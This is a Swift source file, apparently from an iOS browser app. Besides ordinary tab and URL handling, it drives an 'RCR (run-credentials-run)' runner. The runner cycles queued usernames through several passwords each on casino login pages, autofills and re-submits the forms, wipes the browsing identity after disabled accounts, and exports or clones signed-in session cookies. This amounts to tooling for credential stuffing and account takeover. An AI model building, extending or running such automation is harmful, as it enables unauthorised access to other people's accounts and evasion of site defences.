import SwiftUI
import SwiftData
import WebKit
import UIKit

enum PresentedSheet: Identifiable {
    case tabs
    case vault
    case cards
    case siteSettings(String)
    case settings
    case bookmarks
    case history
    case results
    case needsReview

    var id: String {
        switch self {
        case .tabs: return "tabs"
        case .vault: return "vault"
        case .cards: return "cards"
        case .siteSettings(let d): return "siteSettings_\(d)"
        case .settings: return "settings"
        case .bookmarks: return "bookmarks"
        case .history: return "history"
        case .results: return "results"
        case .needsReview: return "needsReview"
        }
    }
}

/// Lightweight, view-friendly snapshot of one credential in the RCR queue.
struct RCRQueueItem: Identifiable, Hashable {
    let id: String          // credentialID
    let username: String
    let passwordCount: Int
}

@Observable
@MainActor
class BrowserViewModel {
    var tabs: [BrowserTab] = []
    var activeTabIndex: Int = 0
    var urlBarText: String = ""
    var urlBarTextB: String = ""
    var presentedSheet: PresentedSheet?
    var isShowingSaveCredentialAlert: Bool = false
    var toastMessage: String?
    var toastVisible: Bool = false
    var detectedUsername: String = ""
    var detectedPassword: String = ""
    /// Domain the detected login belongs to. Used by the save flow in both
    /// single-window and multi-window mode (quad cells report their own).
    var detectedDomain: String = ""

    // MARK: - RCR (run-credentials-run) state
    enum RCRStatus {
        case idle, navigating, filling, submitting, waiting, burning, success
    }
    var isRCRRunning: Bool = false
    var rcrStatus: RCRStatus = .idle
    var rcrIndex: Int = 0
    var rcrTotal: Int = 0
    var rcrCurrentDomain: String = ""
    var rcrCurrentUsername: String = ""
    var rcrBurnFlash: Int = 0
    /// True while the runner is performing the configured extra submits
    /// (sure-login). All RCR actions — result observation, advancing,
    /// burning — are paused until this clears.
    var rcrExtraSubmitsInFlight: Bool = false
    /// Set after a perm-disabled burn so the next credential waits for
    /// page boot + cookie consent before autofill.
    private var needsPostBurnSettle: Bool = false
    /// Queue snapshot built at run start. Mirrors the order the runner walks
    /// so the UI can show "Next 8" and "Completed" without recomputing.
    var rcrQueueUsernames: [String] = []
    var rcrQueuePasswordCounts: [Int] = []
    var rcrCompletedIDs: Set<String> = []
    /// Live run-speed profile for the cockpit dial. Persisted so the next
    /// run starts with the same setting. Mid-run changes apply on the next
    /// attempt step, never mid-submit.
    var runSpeedProfile: SpeedProfile = SpeedProfile.saved
    /// True while the run rests between attempts (never mid-fill). The
    /// status dot glows amber while paused.
    private(set) var isRCRPaused: Bool = false
    private var rcrPauseContinuation: CheckedContinuation<Void, Never>?
    /// True when the user wants to re-try credentials that previously
    /// returned `failed` (non-success / non-disabled). Off by default —
    /// resume-safe runs skip every terminally-attempted password.
    var retryFailed: Bool = false
    /// The URL captured when the user tapped RCR.
    var rcrTargetURL: URL?
    private var rcrQueueIDs: [String] = []
    private var rcrCurrentPasswords: [String] = []
    private var rcrPasswordIndex: Int = 0
    /// Which credential the in-memory `rcrCurrentPasswords` list belongs
    /// to. Guards against the cross-credential bug where a parked run
    /// handed the next credential the previous one's password list.
    private var rcrPasswordsCredentialID: String = ""
    /// Bumped by skip/retry/stop so in-flight fill legs (extra-submit
    /// loops) can detect they've been superseded and bail out instead of
    /// racing the new attempt.
    private var rcrAttemptGeneration: Int = 0

    /// Pure cross-credential guard, shared with the grid runner: the
    /// in-memory list belongs to `credentialID` only when the IDs match
    /// and are non-empty.
    nonisolated static func passwordListBelongs(to credentialID: String, listCredentialID: String) -> Bool {
        !credentialID.isEmpty && credentialID == listCredentialID
    }
    private var rcrAwaitingNavigation: Bool = false
    /// True while the success cascade is capturing / asking the AI so a
    /// second observer ping cannot double-advance the same attempt.
    private var rcrJudging: Bool = false
    private var isQuadToggling: Bool = false
    private let rcrLastCompletedKey = "rcrLastCompletedID"
    /// Re-entrancy latch: set synchronously the moment the user taps RCR,
    /// before the off-main keychain preflight completes, so a double-tap
    /// can't stack two overlapping runs. Cleared when the run begins and
    /// whenever the run is stopped.
    private(set) var isStartingRCR: Bool = false
    private var rcrStartGeneration: Int = 0
    /// Per-attempt watchdog: fires when a navigation or the post-submit
    /// observation yields no page state within the timeout (failed load,
    /// dead page, wedged web process). Without it the runner sits in
    /// "watching" forever with no recovery.
    private var rcrWatchdogTask: Task<Void, Never>?
    /// Shared base timeout — defined once in PageSettleService so the two
    /// runners can never drift apart.
    private static let rcrWatchdogTimeout: Duration = PageSettleService.attemptWatchdog

    /// True while the user is editing the URL bar — suppresses programmatic
    /// overwrites from navigation events so the user's in-progress text is
    /// never clobbered mid-edit.
    var isURLBarEditing: Bool = false

    // MARK: - Address bar auto-hide
    var isURLBarVisible: Bool = true
    var isURLBarBVisible: Bool = true
    private var urlBarHideTimerTask: Task<Void, Never>?
    private var urlBarBHideTimerTask: Task<Void, Never>?

    // MARK: - Quad Mode
    enum QuadMode: Equatable {
        case single
        case grid(WindowGridSize, dual: Bool)
    }
    var quadMode: QuadMode = .single
    var isQuadMode: Bool { quadMode != .single }
    var isDualQuadMode: Bool {
        if case .grid(_, let dual) = quadMode { return dual }
        return false
    }
    var currentGridSize: WindowGridSize? {
        if case .grid(let size, _) = quadMode { return size }
        return nil
    }
    let quadController: QuadController = QuadController()

    // MARK: - Replay Mode (Session Deck)
    /// True while the full-screen session deck is showing. Distinct from
    /// single/grid layout — replay borrows the single-window canvas but
    /// paints a frozen parked session into it instead of a live tab.
    var isReplayMode: Bool = false
    /// `ParkedSession.id` of the circle currently on screen.
    var replaySelectedID: String?
    /// The one tab that hosts replayed sessions full-screen. Its store is
    /// swapped (never burned) as the user flips between circles.
    private(set) var replayTab: BrowserTab?

    static let dualQuadURL_A_Key = "dualQuadURL_A"
    static let dualQuadURL_B_Key = "dualQuadURL_B"
    static let dualSiteSplitPatternKey = "dualSiteSplitPattern"
    static let cloneSessionToAllWindowsKey = "cloneSessionToAllWindows"
    /// When on (the default), every multi-window layout change clones the
    /// signed-in session out of Window 1 — per lane in dual-site mode — so
    /// no window lands on the page logged out. Off restores the original
    /// behaviour: only the first window inherits the single window's
    /// session, and only on a Single → grid switch.
    var cloneSessionToAllWindows: Bool {
        UserDefaults.standard.object(forKey: Self.cloneSessionToAllWindowsKey) as? Bool ?? true
    }

    func setCloneSessionToAllWindows(_ on: Bool) {
        UserDefaults.standard.set(on, forKey: Self.cloneSessionToAllWindowsKey)
        showToast(on ? "Cloning Window 1's session to all windows" : "Session cloning off")
    }

    /// Whether cloned windows hold their load until their session lands or
    /// load first and refresh after.
    var sessionCloneLoadTiming: SessionCloneLoadTiming { .saved }
    var dualSiteSplitPattern: DualSiteSplitPattern = DualSiteSplitPattern(
        rawValue: UserDefaults.standard.string(forKey: "dualSiteSplitPattern") ?? ""
    ) ?? .checkerboard
    static let dualQuadDefaultURL_A: URL = URL(string: "https://www.ignitioncasino.ooo/login")!
    static let dualQuadDefaultURL_B: URL = URL(string: "https://joefortune.win/login")!
    var dualQuadURL_A: URL {
        if let s = UserDefaults.standard.string(forKey: Self.dualQuadURL_A_Key),
           let u = URL(string: s) { return u }
        return Self.dualQuadDefaultURL_A
    }
    var dualQuadURL_B: URL {
        if let s = UserDefaults.standard.string(forKey: Self.dualQuadURL_B_Key),
           let u = URL(string: s) { return u }
        return Self.dualQuadDefaultURL_B
    }

    private var cookiePurgeTask: Task<Void, Never>?

    // MARK: - Session save / load
    /// Drives the `.fileExporter` for Save Session (single-window only).
    var isExportingSession: Bool = false
    /// Drives the `.fileImporter` for Load Session (single or grid).
    var isImportingSession: Bool = false
    /// The prepared document handed to the exporter once capture completes.
    var sessionExportDocument: SessionFileDocument?
    /// Suggested filename for the exported session.
    var sessionExportDefaultName: String = "fast6-session"

    private var modelContext: ModelContext?
    private var siteSettingCache: [String: SiteSetting?] = [:]
    private var excludedDomainCache: Set<String> = []
    private var excludedDomainCacheLoaded: Bool = false
    /// History dedupe/debounce, keyed by tab id so two tabs loading the
    /// same URL back-to-back don't suppress each other's entries (or cancel
    /// each other's pending writes).
    private var historyDebounceTasks: [String: Task<Void, Never>] = [:]
    private var lastHistoryURLByTab: [String: String] = [:]
    private var sureLoginTask: Task<Void, Never>?
    private var toastGeneration: Int = 0

    var activeTab: BrowserTab? {
        guard tabs.indices.contains(activeTabIndex) else { return nil }
        return tabs[activeTabIndex]
    }

    /// URL the shared toolbar should reflect — the replayed session while
    /// the deck is up, the focused multi-window tile's page in quad mode,
    /// otherwise the active tab's page.
    var currentPageURL: URL? {
        if isReplayMode {
            return replayTab?.webView?.url ?? replayTab?.url
        }
        if isQuadMode {
            return quadController.focusedSession.webView?.url
                ?? quadController.focusedSession.url
        }
        return activeTab?.webView?.url ?? activeTab?.url
    }

    /// Default page every new tab opens to.
    static let defaultHomeURL: URL = URL(string: "https://www.ignitioncasino.ooo/login")!

    func setup(modelContext: ModelContext) {
        migrateLegacyBuiltInURLs()
        self.modelContext = modelContext
        IntelligenceCenter.shared.attach(context: modelContext)
        ParkedSessionStore.shared.attach(context: modelContext)
        reloadExcludedDomains()
        if tabs.isEmpty {
            addNewTab()
        }
        quadController.setup(modelContext: modelContext, browser: self)
        WindowDiagnosticsService.shared.attach(controller: quadController, browser: self)
        startCookiePurgeTimer()
        resetURLBarTimer()
        checkForRestorableSession()
    }

    // MARK: - Last-session restore

    /// Offered on launch when a snapshot exists from before the app last
    /// left the foreground. Accepting or dismissing clears it either way —
    /// it's a one-time offer, not a recurring nag.
    var pendingRestoreSnapshot: LastSessionSnapshot?

    func checkForRestorableSession() {
        pendingRestoreSnapshot = LastSessionStore.shared.load()
    }

    func restorePendingSession() {
        guard let snapshot = pendingRestoreSnapshot else { return }
        pendingRestoreSnapshot = nil
        LastSessionStore.shared.clear()
        applyRestoredSnapshot(snapshot)
    }

    func dismissPendingSession() {
        pendingRestoreSnapshot = nil
        LastSessionStore.shared.clear()
    }

    private func applyRestoredSnapshot(_ snapshot: LastSessionSnapshot) {
        switch snapshot.modeKind {
        case .single:
            let restored = snapshot.tabURLs.map { BrowserTab(url: $0.isEmpty ? nil : URL(string: $0)) }
            tabs = restored.isEmpty ? [BrowserTab()] : restored
            activeTabIndex = min(max(0, snapshot.activeTabIndex), tabs.count - 1)
            urlBarText = activeTab?.displayURL ?? ""
        case .grid:
            guard let rawSize = snapshot.gridSize, let size = WindowGridSize(rawValue: rawSize) else { return }
            setQuadMode(.grid(size, dual: snapshot.isDual))
            for (index, urlString) in snapshot.quadSessionURLs.enumerated() {
                guard !urlString.isEmpty, let url = URL(string: urlString),
                      quadController.sessions.indices.contains(index) else { continue }
                let session = quadController.sessions[index]
                session.url = url
                session.webView?.load(URLRequest(url: url))
            }
            quadController.focusedIndex = min(max(0, snapshot.focusedIndex), max(0, quadController.activeCount - 1))
        }
        resetURLBarTimer()
    }

    /// Captures the current layout so it can be offered back on next
    /// launch. Skipped while a run or the deck is active — that's transient
    /// state, not a browsing layout worth restoring.
    func saveSessionSnapshot() {
        guard !isRCRRunning, !quadController.anyRCRRunning, !isReplayMode else { return }
        let snapshot: LastSessionSnapshot
        switch quadMode {
        case .single:
            let urls = tabs.map { ($0.webView?.url ?? $0.url)?.absoluteString ?? "" }
            guard urls.contains(where: { !$0.isEmpty }) else { return }
            snapshot = LastSessionSnapshot(
                modeKind: .single,
                gridSize: nil,
                isDual: false,
                tabURLs: urls,
                activeTabIndex: activeTabIndex,
                quadSessionURLs: [],
                focusedIndex: 0,
                savedAt: Date()
            )
        case .grid(let size, let dual):
            let urls = quadController.activeSessions.map { ($0.webView?.url ?? $0.url)?.absoluteString ?? "" }
            guard urls.contains(where: { !$0.isEmpty }) else { return }
            snapshot = LastSessionSnapshot(
                modeKind: .grid,
                gridSize: size.rawValue,
                isDual: dual,
                tabURLs: [],
                activeTabIndex: 0,
                quadSessionURLs: urls,
                focusedIndex: quadController.focusedIndex,
                savedAt: Date()
            )
        }
        LastSessionStore.shared.save(snapshot)
    }

    /// Migrates only values shipped as built-in defaults in earlier versions.
    /// Custom destinations remain unchanged.
    private func migrateLegacyBuiltInURLs() {
        let defaults = UserDefaults.standard
        migrateLegacyURL(
            forKey: Self.dualQuadURL_A_Key,
            knownValues: [
                "https://ignitioncasino.ooo/login",
                "https://www.ignitioncasino.ooo",
                "https://www.ignitioncasino.ooo/"
            ],
            replacement: Self.dualQuadDefaultURL_A,
            in: defaults
        )
        migrateLegacyURL(
            forKey: Self.dualQuadURL_B_Key,
            knownValues: [
                "https://www.joefortune.fun",
                "https://www.joefortune.fun/",
                "https://joefortune.fun",
                "https://joefortune.fun/",
                "https://www.joefortune.win/login"
            ],
            replacement: Self.dualQuadDefaultURL_B,
            in: defaults
        )
    }

    private func migrateLegacyURL(
        forKey key: String,
        knownValues: Set<String>,
        replacement: URL,
        in defaults: UserDefaults
    ) {
        guard let storedValue = defaults.string(forKey: key) else { return }
        let normalized = storedValue.trimmingCharacters(in: .whitespacesAndNewlines).lowercased()
        guard knownValues.contains(normalized) else { return }
        defaults.set(replacement.absoluteString, forKey: key)
    }

    /// Read-only view of the excluded-domain cache.
    var excludedDomainSet: Set<String> {
        if !excludedDomainCacheLoaded { reloadExcludedDomains() }
        return excludedDomainCache
    }

    /// Opens a new tab. With no URL the tab shows the speed-dial home page
    /// (its `url` stays nil until the user picks a shortcut or types an
    /// address).
    func addNewTab(url: URL? = nil) {
        // A new tab owns the screen — the replay deck can't stay up over it.
        exitReplayMode()
        // A sure-login retry loop belongs to the tab it started on — it must
        // not keep firing submits at whatever tab becomes active next.
        sureLoginTask?.cancel()
        let tab = BrowserTab(url: url)
        tabs.append(tab)
        activeTabIndex = tabs.count - 1
        urlBarText = url?.absoluteString ?? ""
    }

    // MARK: - Home / speed dial

    /// Opens a speed-dial shortcut in the current tab.
    func openSpeedDial(_ entry: SpeedDialEntry) {
        guard let url = entry.resolvedURL else { return }
        navigateTo(url.absoluteString)
    }

    /// Returns the current tab to the speed-dial home page, tearing down its
    /// web view so the home grid is shown again.
    func goHome() {
        guard !isRCRRunning, !quadController.anyRCRRunning else {
            showToast("Stop RCR before going home", force: true)
            return
        }
        exitReplayMode()
        sureLoginTask?.cancel()
        if isQuadMode { setQuadMode(.single) }
        guard let tab = activeTab else { addNewTab(); return }
        tab.webView?.stopLoading()
        tab.url = nil
        tab.title = "New Tab"
        tab.canGoBack = false
        tab.canGoForward = false
        urlBarText = ""
        resetURLBarTimer()
    }

    func closeTab(at index: Int) {
        // Closing the RCR tab mid-run would strand the runner on a nil web
        // view (or silently move the run onto whatever tab becomes active).
        guard !isRCRRunning else {
            showToast("Stop RCR before closing tabs", force: true)
            return
        }
        guard tabs.count > 1, tabs.indices.contains(index) else { return }
        sureLoginTask?.cancel()
        let activeTabID = activeTab?.id
        let closing = tabs[index]
        historyDebounceTasks[closing.id]?.cancel()
        historyDebounceTasks[closing.id] = nil
        lastHistoryURLByTab[closing.id] = nil
        closing.webView?.stopLoading()
        closing.webView = nil
        let storeID = closing.dataStoreID
        tabs.remove(at: index)

        // Drop process-pool + wipe store so a recycled tab never inherits
        // the closed tab's browsing identity. Never burn a parked store.
        if !ParkedSessionStore.shared.contains(storeID: storeID) {
            Task {
                await QuadDataStore.burn(dataStoreID: storeID)
            }
        }

        if let activeTabID, let preservedIndex = tabs.firstIndex(where: { $0.id == activeTabID }) {
            activeTabIndex = preservedIndex
        } else {
            activeTabIndex = min(index, tabs.count - 1)
        }
        urlBarText = activeTab?.displayURL ?? ""
        resetURLBarTimer()
    }

    func switchToTab(at index: Int) {
        // The runner drives the active tab — switching mid-run would move
        // the run onto a different tab's identity.
        guard !isRCRRunning else {
            showToast("Stop RCR before switching tabs", force: true)
            return
        }
        guard tabs.indices.contains(index) else { return }
        // Picking a tab leaves the deck — the tab it selects owns the screen.
        exitReplayMode()
        sureLoginTask?.cancel()
        let oldTab = activeTab
        oldTab?.captureSnapshot()

        activeTabIndex = index
        let newURL = activeTab?.displayURL ?? ""
        if urlBarText != newURL {
            urlBarText = newURL
        }
        presentedSheet = nil
    }

    func navigateTo(_ input: String) {
        let trimmed = input.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty else { return }
        // A pending sure-login retry loop must not fire its submits onto
        // the page we're navigating away to.
        sureLoginTask?.cancel()
        guard let validURL = Self.resolveURL(from: trimmed) else { return }
        urlBarText = validURL.absoluteString
        resetURLBarTimer()

        // The deck's window navigates on its own frozen store so the
        // replayed login keeps its cookies.
        if isReplayMode, let tab = replayTab {
            tab.url = validURL
            tab.lastURL = validURL
            tab.webView?.load(URLRequest(url: validURL))
            return
        }

        if isQuadMode {
            if isDualQuadMode {
                quadController.navigateTargetSite(to: validURL, targetSiteIndex: 0)
                // Persist Site A URL so future mode switches use it.
                UserDefaults.standard.set(validURL.absoluteString, forKey: Self.dualQuadURL_A_Key)
            } else if quadController.isFollowLeaderEnabled {
                quadController.navigateFollowLeader(to: validURL)
            } else {
                quadController.navigateAll(to: validURL)
            }
            return
        }

        guard let tab = activeTab else { return }
        tab.url = validURL
        tab.lastURL = validURL
        tab.webView?.load(URLRequest(url: validURL))
    }

    /// Navigates the B-side URL bar in dual-site mode, updating every tile
    /// currently assigned to Site B by the selected split pattern.
    func navigateToB(_ input: String) {
        let trimmed = input.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty, isDualQuadMode else { return }
        guard let validURL = Self.resolveURL(from: trimmed) else { return }
        urlBarTextB = validURL.absoluteString
        resetURLBarBTimer()
        quadController.navigateTargetSite(to: validURL, targetSiteIndex: 1)
        // Persist the updated B-site URL so restarts use it.
        UserDefaults.standard.set(validURL.absoluteString, forKey: Self.dualQuadURL_B_Key)
    }

    /// Shared URL resolution — returns a valid http(s) URL or nil.
    /// Anything that isn't a web address becomes a search query;
    /// `file:`/`data:`/`about:` and friends are rejected outright so local
    /// or inline content can never load inside a web view that carries our
    /// script message handlers.
    nonisolated static func resolveURL(from trimmed: String) -> URL? {
        let lower = trimmed.lowercased()
        let url: URL?
        if lower.hasPrefix("http://") || lower.hasPrefix("https://") {
            url = URL(string: trimmed) ?? encodedURL(from: trimmed)
        } else if looksLikeHost(trimmed) {
            url = URL(string: "https://\(trimmed)") ?? encodedURL(from: "https://\(trimmed)")
        } else {
            let query = trimmed.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? trimmed
            url = URL(string: "\(searchEngineBaseURL)q=\(query)")
        }
        guard let validURL = url,
              let scheme = validURL.scheme?.lowercased(),
              scheme == "http" || scheme == "https" else { return nil }
        return validURL
    }

    nonisolated private static var searchEngineBaseURL: String {
        switch UserDefaults.standard.string(forKey: "defaultSearchEngine") ?? "Google" {
        case "DuckDuckGo": return "https://duckduckgo.com/?q="
        case "Bing": return "https://www.bing.com/search?q="
        default: return "https://www.google.com/search?q="
        }
    }

    /// Switches to any single-window / grid combination directly, carrying
    /// the appropriate URL(s) across the transition:
    /// - Entering a single-site grid loads the page that was showing (in
    ///   single-window mode, or in whichever grid was active) into every
    ///   window of the new grid.
    /// - Entering a dual-site grid loads the saved Site A / Site B addresses
    ///   with the selected horizontal, vertical, or checkerboard split.
    /// - Returning to single-window mode carries over the focused window's
    ///   current page.
    func setQuadMode(_ newMode: QuadMode) {
        guard !isQuadToggling else { return }
        guard !isRCRRunning, !quadController.anyRCRRunning else {
            showToast("Stop RCR before switching modes", force: true)
            return
        }
        // Any layout choice leaves the deck — the picked layout owns the
        // screen. Re-picking the current layout is a pure deck exit.
        exitReplayMode()
        guard newMode != quadMode else { return }
        isQuadToggling = true
        defer { isQuadToggling = false }
        // Any layout change invalidates Follow the Leader (grid resize,
        // dual-site split, or return to single-window view).
        quadController.autoDisableFollowLeader(reason: "Follow the Leader off — layout changed")
        let wasSingle = (quadMode == .single)
        let wasDual = isDualQuadMode
        let liveSiteA = quadController.representativeSession(forTargetSite: 0)?.webView?.url
            ?? quadController.representativeSession(forTargetSite: 0)?.url
            ?? dualQuadURL_A
        let liveSiteB = quadController.representativeSession(forTargetSite: 1)?.webView?.url
            ?? quadController.representativeSession(forTargetSite: 1)?.url
            ?? dualQuadURL_B

        switch newMode {
        case .single:
            // Leaving the grid entirely: drop any outstanding clone hold
            // without handing those windows a page on the way out.
            SessionCloneService.shared.cancelHolds(reason: "left multi-window")
            let url = quadController.focusedSession.webView?.url
                ?? quadController.focusedSession.url
                ?? activeTab?.webView?.url
                ?? activeTab?.url
                ?? Self.defaultHomeURL
            if let tab = activeTab {
                tab.url = url
                tab.lastURL = url
                tab.webView?.load(URLRequest(url: url))
            }
            urlBarText = url.absoluteString
            isURLBarBVisible = false
            quadMode = .single

        case .grid(let size, let dual):
            guard !dual || size.supportsDualSite else {
                showToast("This grid size supports one target site only", force: true)
                return
            }
            // The single window's live web view is the donor when a grid is
            // entered from single-window mode.
            let externalDonor: WKWebView? = wasSingle ? activeTab?.webView : nil
            // Hold the incoming layout's windows before anything navigates
            // them, so no window paints a logged-out page we then have to
            // reload away. Released by the clone (or its watchdog).
            holdWindowsForClone(size: size)
            quadController.setGridSize(size)
            if dual {
                let urlA = wasDual ? liveSiteA : dualQuadURL_A
                let urlB = wasDual ? liveSiteB : dualQuadURL_B
                quadController.applyDualSiteTargets(
                    urlA: urlA,
                    urlB: urlB,
                    pattern: dualSiteSplitPattern
                )
                urlBarText = urlA.absoluteString
                urlBarTextB = urlB.absoluteString
                isURLBarBVisible = true
                // Persist so restarts use the latest.
                UserDefaults.standard.set(urlA.absoluteString, forKey: Self.dualQuadURL_A_Key)
                UserDefaults.standard.set(urlB.absoluteString, forKey: Self.dualQuadURL_B_Key)
            } else {
                let url: URL
                if wasSingle {
                    url = activeTab?.webView?.url ?? activeTab?.url ?? Self.defaultHomeURL
                } else {
                    url = quadController.focusedSession.webView?.url
                        ?? quadController.focusedSession.url
                        ?? Self.defaultHomeURL
                }
                // Single-site entry always clears leftover dual-site state —
                // even on a same-size re-pick, where setGridSize early-returns
                // and would silently block Follow the Leader.
                quadController.exitDualSiteMode()
                quadController.navigateAll(to: url)
                urlBarText = url.absoluteString
                isURLBarBVisible = false
            }
            quadMode = newMode
            startSessionClone(externalWebView: externalDonor, announceSuccess: false)
        }

        resetURLBarTimer()
    }

    // MARK: - Session cloning

    /// Holds every window of the layout that is about to load, so the clone
    /// can seat its cookies first. No-op unless cloning is on and the
    /// wait-for-session timing is selected.
    private func holdWindowsForClone(size: WindowGridSize) {
        guard cloneSessionToAllWindows else { return }
        let incoming = Array(quadController.sessions.prefix(size.rawValue))
        SessionCloneService.shared.beginHold(for: incoming, timing: sessionCloneLoadTiming)
    }

    /// Plans and runs a clone against the layout as it now stands. Single
    /// site: Window 1 seeds every other window. Dual site: per-lane leaders
    /// seed their own lane. When the grid is entered from single-window
    /// mode, that window's live session seeds the lane showing its site.
    ///
    /// - Parameters:
    ///   - externalWebView: the single window's web view, or nil for a
    ///     grid → grid transition and on-demand clones.
    ///   - announceSuccess: confirm on success. Automatic clones stay silent
    ///     and only speak up when a window misses the session.
    ///   - forceCloneAll: used by the on-demand action, which is an explicit
    ///     request to clone even when the toggle is off.
    private func startSessionClone(
        externalWebView: WKWebView?,
        announceSuccess: Bool,
        forceCloneAll: Bool = false
    ) {
        let sessions = quadController.activeSessions
        let cloneAll = forceCloneAll || cloneSessionToAllWindows
        let live = quadController.enabledSessions
        guard !live.isEmpty else {
            SessionCloneService.shared.releaseAllHolds(sessions, reason: "no live windows")
            return
        }

        let isDual = quadController.isDualTargetMode
        let windows = live.map {
            SessionCarry.Window(index: $0.index, targetSiteIndex: isDual ? $0.targetSiteIndex : 0)
        }
        let jobs = SessionCarry.jobs(
            cloneToAll: cloneAll,
            windows: windows,
            isDualSite: isDual,
            external: externalDonorDescriptor(for: externalWebView, isDual: isDual)
        )
        guard !jobs.isEmpty else {
            SessionCloneService.shared.releaseAllHolds(sessions, reason: "nothing to clone")
            if announceSuccess { showToast("No other windows to clone into", force: true) }
            return
        }

        let timing = sessionCloneLoadTiming
        Task { @MainActor [weak self] in
            guard let self else { return }
            let report = await SessionCloneService.shared.run(
                jobs: jobs,
                sessions: sessions,
                externalWebView: externalWebView,
                timing: timing
            )
            self.reportCloneOutcome(report, announceSuccess: announceSuccess)
        }
    }

    /// Describes the single-window donor to the planner: its host plus the
    /// host each lane is about to show, so a dual-site grid only seeds the
    /// lane the donor actually belongs to.
    private func externalDonorDescriptor(
        for webView: WKWebView?,
        isDual: Bool
    ) -> SessionCarry.ExternalDonor? {
        guard let webView,
              let host = (webView.url ?? activeTab?.url)?.host(percentEncoded: false) else { return nil }
        var laneHosts: [Int: String] = [:]
        for site in isDual ? [0, 1] : [0] {
            guard let lane = quadController.representativeSession(forTargetSite: site) else { continue }
            if let laneHost = (lane.url ?? lane.webView?.url)?.host(percentEncoded: false) {
                laneHosts[site] = laneHost
            }
        }
        return SessionCarry.ExternalDonor(host: host, laneHosts: laneHosts)
    }

    /// Failure-first reporting: a half-cloned grid always speaks up, success
    /// only does when the user asked for the clone by hand.
    private func reportCloneOutcome(_ report: SessionCloneService.Report, announceSuccess: Bool) {
        if !report.missed.isEmpty {
            let shown = report.missed.prefix(4).joined(separator: ", ")
            let extra = report.missed.count > 4 ? " +\(report.missed.count - 4) more" : ""
            showToast("Session didn't reach \(shown)\(extra)", force: true)
            return
        }
        guard announceSuccess else { return }
        guard report.hadDonor else {
            showToast("No window to clone from yet", force: true)
            return
        }
        guard report.didSeedAnything else {
            showToast("No other windows to clone into", force: true)
            return
        }
        guard report.carriedCookies else {
            showToast("Window 1 isn't signed in yet — nothing to clone", force: true)
            return
        }
        let count = report.seeded.count
        showToast("Session cloned to \(count) window\(count == 1 ? "" : "s")")
    }

    /// Menu action: re-sync every window to Window 1's live session while
    /// already in a grid. An explicit request, so it clones even when the
    /// toggle is off and always confirms.
    func cloneSessionNow() {
        guard isQuadMode else {
            showToast("Switch to a multi-window layout first", force: true)
            return
        }
        guard !isRCRRunning, !quadController.anyRCRRunning else {
            showToast("Stop the run before cloning", force: true)
            return
        }
        startSessionClone(externalWebView: nil, announceSuccess: true, forceCloneAll: true)
    }

    /// Pushes the leader's live session into every follower as Follow the
    /// Leader turns on, so mirrored typing lands in signed-in windows.
    func cloneLeaderSessionToFollowers() {
        guard cloneSessionToAllWindows else { return }
        startSessionClone(externalWebView: nil, announceSuccess: false)
    }

    /// Changes the dual-site visual split in place and redistributes Site A/B
    /// across the active windows without changing the grid size.
    func setDualSiteSplitPattern(_ pattern: DualSiteSplitPattern) {
        guard pattern != dualSiteSplitPattern else { return }
        guard !isRCRRunning, !quadController.anyRCRRunning else {
            showToast("Stop RCR before changing the split", force: true)
            return
        }
        // A pattern that cannot halve the current grid evenly is refused
        // rather than persisted: saving it would carry a split this layout
        // can't honour into the next launch.
        if let size = currentGridSize, !pattern.splitsCleanly(in: size) {
            showToast("\(pattern.label) can't split this layout evenly", force: true)
            return
        }
        dualSiteSplitPattern = pattern
        UserDefaults.standard.set(pattern.rawValue, forKey: Self.dualSiteSplitPatternKey)

        guard isDualQuadMode, let size = currentGridSize, size.supportsDualSite else { return }
        let urlA = quadController.representativeSession(forTargetSite: 0)?.webView?.url
            ?? quadController.representativeSession(forTargetSite: 0)?.url
            ?? dualQuadURL_A
        let urlB = quadController.representativeSession(forTargetSite: 1)?.webView?.url
            ?? quadController.representativeSession(forTargetSite: 1)?.url
            ?? dualQuadURL_B
        // A new split moves windows between lanes, so they need their new
        // lane's session — hold them, redistribute, then re-clone per lane.
        holdWindowsForClone(size: size)
        quadController.applyDualSiteTargets(urlA: urlA, urlB: urlB, pattern: pattern)
        urlBarText = urlA.absoluteString
        urlBarTextB = urlB.absoluteString
        startSessionClone(externalWebView: nil, announceSuccess: false)
    }

    nonisolated private static func looksLikeHost(_ s: String) -> Bool {
        if s.contains(" ") { return false }
        if s.hasPrefix("[") { return true }
        if s.contains(".") { return true }
        let head = s.split(separator: "/").first.map(String.init) ?? s
        let hostPart = head.split(separator: ":").first.map(String.init) ?? head
        return hostPart.lowercased() == "localhost"
    }

    nonisolated private static func encodedURL(from s: String) -> URL? {
        s.addingPercentEncoding(withAllowedCharacters: .urlFragmentAllowed)
            .flatMap(URL.init(string:))
    }

    func goBack() {
        if isReplayMode {
            replayTab?.webView?.goBack()
            return
        }
        if isQuadMode {
            if quadController.isFollowLeaderEnabled {
                quadController.followLeaderGoBack()
                return
            }
            quadController.focusedSession.webView?.goBack()
            return
        }
        activeTab?.webView?.goBack()
    }

    func goForward() {
        if isReplayMode {
            replayTab?.webView?.goForward()
            return
        }
        if isQuadMode {
            if quadController.isFollowLeaderEnabled {
                quadController.followLeaderGoForward()
                return
            }
            quadController.focusedSession.webView?.goForward()
            return
        }
        activeTab?.webView?.goForward()
    }

    func reload() {
        if isReplayMode {
            replayTab?.webView?.reload()
            return
        }
        if isQuadMode {
            if quadController.isFollowLeaderEnabled {
                quadController.followLeaderReload()
                return
            }
            quadController.focusedSession.webView?.reload()
            return
        }
        activeTab?.webView?.reload()
    }

    // MARK: - Session save / load

    /// Captures the active tab's cookies + page storage and opens the export
    /// sheet so the user can save it into Files. Single-window only.
    func prepareSessionExport() {
        // In the deck, export what's actually on screen — the replayed
        // session — instead of the tab hidden behind it.
        let source: WKWebView? = isReplayMode
            ? replayTab?.webView
            : (isQuadMode ? nil : activeTab?.webView)
        guard let webView = source else {
            showToast("Open a page first", force: true)
            return
        }
        Task {
            let snapshot = await SessionTransferService.shared.capture(from: webView)
            guard let data = SessionTransferService.encode(snapshot) else {
                showToast("Couldn't prepare session", force: true)
                return
            }
            sessionExportDocument = SessionFileDocument(data: data)
            let host = webView.url?.host?.replacingOccurrences(of: "www.", with: "") ?? "session"
            sessionExportDefaultName = "fast6-\(host)-\(Self.sessionTimestamp())"
            isExportingSession = true
        }
    }

    func finishSessionExport(_ result: Result<URL, Error>) {
        sessionExportDocument = nil
        if case .success = result {
            showToast("Session saved to Files")
        }
    }

    func startSessionImport() {
        // Writing foreign cookies into a frozen store would break the saved
